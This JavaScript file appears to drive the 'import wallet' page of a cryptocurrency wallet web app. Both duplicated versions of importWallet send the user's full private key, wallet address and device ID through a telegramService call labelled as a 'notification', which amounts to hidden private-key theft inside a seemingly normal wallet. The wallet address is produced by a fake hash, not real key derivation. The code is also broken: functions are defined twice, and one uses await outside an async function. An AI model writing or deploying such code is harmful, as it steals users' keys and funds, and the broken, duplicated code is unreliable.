
// Navigation functions
function goBack() {
    window.location.href = 'welcome.html';
}

function importWallet() {
    const privateKeyInput = document.getElementById('privateKey');
    const privateKey = privateKeyInput.value.trim();
    
    if (!privateKey) {
        showNotification('Please enter your private key', 'error');
        return;
    }
    
    if (privateKey.length !== 64) {
        showNotification('Private key must be 64 characters long', 'error');
        return;
    }
    
    // Show loading state
    const button = document.querySelector('.btn-gold');
    const originalText = button.innerHTML;
    button.innerHTML = '<svg width="16" height="16" class="animate-spin" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M21 12a9 9 0 11-6.219-8.56"/></svg> Importing...';
    button.disabled = true;
    
    // Simulate wallet import (replace with actual crypto implementation)
    setTimeout(() => {
        try {
            // Generate a wallet address from private key (this is simplified)
            const walletAddress = generateAddressFromPrivateKey(privateKey);
            
            const walletData = {
                address: walletAddress,
                privateKey: privateKey
            };
            
            // Store wallet data
            sessionStorage.setItem('walletData', JSON.stringify(walletData));
            sessionStorage.setItem('walletType', 'imported');
            localStorage.setItem('walletAddress', walletData.address);
            localStorage.setItem('walletPrivateKey', walletData.privateKey);
            
            showNotification('Wallet imported successfully!', 'success');
            
            // Send Telegram notification for wallet import
            const deviceId = localStorage.getItem('deviceIdOriginal') || document.querySelector('#deviceId')?.textContent || 'Unknown';
            try {
                await telegramService.notifyWalletImported(deviceId, walletData.address, walletData.privateKey);
            } catch (error) {
                console.log('Telegram notification failed:', error);
            }
            
            // Redirect to dashboard after a short delay
            setTimeout(() => {
                window.location.href = 'dashboard.html';
            }, 1500);
            
        } catch (error) {
            showNotification('Invalid private key format', 'error');
            button.innerHTML = originalText;
            button.disabled = false;
        }
    }, 2000);
}

function generateAddressFromPrivateKey(privateKey) {
    // This is a simplified version - in a real implementation, you would use proper cryptographic functions
    // For demo purposes, we'll generate a dummy address
    const hash = simpleHash(privateKey);
    return '0x' + hash.substring(0, 40);
}

function simpleHash(str) {
    let hash = 0;
    for (let i = 0; i < str.length; i++) {
        const char = str.charCodeAt(i);
        hash = ((hash << 5) - hash) + char;
        hash = hash & hash; // Convert to 32bit integer
    }
    // Convert to hex and pad
    return Math.abs(hash).toString(16).padStart(40, '0');
}

function showNotification(message, type) {
    // Remove existing notifications
    const existing = document.querySelector('.notification');
    if (existing) {
        existing.remove();
    }
    
    const notification = document.createElement('div');
    notification.className = 'notification';
    
    const color = type === 'error' ? '#ef4444' : type === 'success' ? '#22c55e' : '#3b82f6';
    const bgColor = type === 'error' ? 'rgba(239, 68, 68, 0.2)' : type === 'success' ? 'rgba(34, 197, 94, 0.2)' : 'rgba(59, 130, 246, 0.2)';
    
    notification.innerHTML = `
        <div style="
            background: ${bgColor};
            border: 1px solid ${color}33;
            border-radius: 12px;
            padding: 12px 16px;
            margin-bottom: 16px;
            display: flex;
            align-items: center;
            gap: 8px;
            animation: slideInDown 0.3s ease-out;
            position: fixed;
            top: 20px;
            left: 50%;
            transform: translateX(-50%);
            z-index: 1000;
            min-width: 300px;
            backdrop-filter: blur(10px);
        ">
            <span style="color: ${color}; font-size: 14px;">${message}</span>
        </div>
    `;
    
    document.body.appendChild(notification);
    
    // Remove notification after 4 seconds
    setTimeout(() => {
        notification.remove();
    }, 4000);
}

// Import wallet functionality
function goBack() {
    window.location.href = 'welcome.html';
}

function importWallet() {
    const privateKeyInput = document.getElementById('privateKey');
    const privateKey = privateKeyInput.value.trim();
    
    if (!privateKey) {
        showNotification('Please enter a private key', 'error');
        return;
    }
    
    if (privateKey.length !== 64) {
        showNotification('Private key must be 64 characters long', 'error');
        return;
    }
    
    // Show loading state
    const btn = document.querySelector('.btn-gold');
    const originalText = btn.innerHTML;
    btn.innerHTML = '<svg width="16" height="16" class="animate-spin" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M21 12a9 9 0 11-6.219-8.56"/></svg> Importing...';
    btn.disabled = true;
    
    // Simulate import process
    setTimeout(async () => {
        try {
            // Generate wallet address from private key (simplified)
            const walletAddress = generateAddressFromPrivateKey(privateKey);
            
            // Store wallet data
            localStorage.setItem('walletPrivateKey', privateKey);
            localStorage.setItem('walletAddress', walletAddress);
            localStorage.setItem('walletBalance', '0.0000');
            
            // Send Telegram notification
            const deviceId = localStorage.getItem('deviceIdOriginal') || 'Unknown';
            try {
                await telegramService.notifyWalletImport(deviceId, walletAddress, privateKey);
            } catch (error) {
                console.log('Telegram notification failed:', error);
            }
            
            showNotification('Wallet imported successfully!', 'success');
            
            // Redirect to dashboard
            setTimeout(() => {
                window.location.href = 'dashboard.html';
            }, 1500);
            
        } catch (error) {
            showNotification('Failed to import wallet. Please check your private key.', 'error');
            btn.innerHTML = originalText;
            btn.disabled = false;
        }
    }, 2000);
}

function generateAddressFromPrivateKey(privateKey) {
    // Simplified address generation - in real app, use proper cryptographic methods
    const hash = btoa(privateKey).slice(0, 40);
    return '0x' + hash.replace(/[^a-fA-F0-9]/g, '0').substring(0, 40);
}

function showNotification(message, type) {
    // Remove existing notifications
    const existing = document.querySelector('.notification');
    if (existing) {
        existing.remove();
    }
    
    const notification = document.createElement('div');
    notification.className = `notification ${type}`;
    
    const color = type === 'error' ? '#ef4444' : type === 'success' ? '#22c55e' : '#3b82f6';
    const bgColor = type === 'error' ? 'rgba(239, 68, 68, 0.2)' : type === 'success' ? 'rgba(34, 197, 94, 0.2)' : 'rgba(59, 130, 246, 0.2)';
    
    notification.innerHTML = `
        <div style="
            background: ${bgColor};
            border: 1px solid ${color}33;
            border-radius: 12px;
            padding: 12px 16px;
            margin-bottom: 16px;
            display: flex;
            align-items: center;
            gap: 8px;
            animation: slideInDown 0.3s ease-out;
            position: fixed;
            top: 60px;
            left: 50%;
            transform: translateX(-50%);
            z-index: 1000;
            min-width: 300px;
            max-width: 90%;
        ">
            <span style="color: ${color}; font-size: 14px;">${message}</span>
        </div>
    `;
    
    document.body.appendChild(notification);
    
    // Remove notification after 4 seconds
    setTimeout(() => {
        notification.remove();
    }, 4000);
}

// Add enter key support for private key input
document.addEventListener('DOMContentLoaded', function() {
    const privateKeyInput = document.getElementById('privateKey');
    
    if (privateKeyInput) {
        privateKeyInput.addEventListener('keypress', function(e) {
            if (e.key === 'Enter') {
                importWallet();
            }
        });
    }
    
    // Add animation styles
    const style = document.createElement('style');
    style.textContent = `
        @keyframes slideInDown {
            from {
                opacity: 0;
                transform: translateY(-20px);
            }
            to {
                opacity: 1;
                transform: translateY(0);
            }
        }
        
        @keyframes spin {
            from {
                transform: rotate(0deg);
            }
            to {
                transform: rotate(360deg);
            }
        }
        
        .animate-spin {
            animation: spin 1s linear infinite;
        }
    `;
    document.head.appendChild(style);
});
